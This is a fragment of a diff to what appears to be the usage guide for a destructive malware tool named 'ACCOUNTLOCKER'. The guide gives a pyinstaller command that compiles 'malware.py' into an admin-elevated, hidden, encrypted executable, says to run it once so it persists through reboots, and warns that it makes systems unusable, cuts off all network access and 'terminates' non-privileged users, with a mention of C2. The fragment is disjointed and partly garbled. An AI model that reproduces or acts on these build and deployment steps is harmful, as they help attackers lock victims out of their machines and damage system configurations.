@@ -1,18 +1,11 @@
 --FOR ACCOUNTLOCKER--
 
-𝗗𝗘𝗔𝗗𝗠𝗔𝗡 𝗦𝗪𝗜𝗧𝗖𝗛 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗
 
-diff
-+ SYSTEM LOCKDOWN PROTOCOL ENGAGED  
-- ALL NON-PRIVILEGED USERS TERMINATED  
-! FIREWALL RULES NUKED CONNECTIONS  
 𝗘𝗫𝗘𝗖𝗨𝗧𝗜𝗢𝗡 𝗚𝗨𝗜𝗗𝗘:
 
 Replace ADMIN_ACCOUNT with your local admin name
 
 Compile to EXE:
-
-
 pyinstaller --onefile --uac-admin --noconsole --key=YourEncryptionKey malware.py  
 
 Execute ONCE with admin rights - persists through reboots
@@ -35,7 +28,7 @@ Test by trying to login with non-admin account
 
 𝗪𝗔𝗥𝗡𝗜𝗡𝗚:
 
-diff
+
 - THIS IS DIGITAL WARFARE - SYSTEMS WILL BECOME UNUSABLE  
 - TEST IN VM ONLY - IRREVERSIBLE CHANGES TO SYSTEM CONFIG  
 - FIREWALL RULES WILL BLOCK ALL NETWORK ACCESS INCLUDING YOUR C2
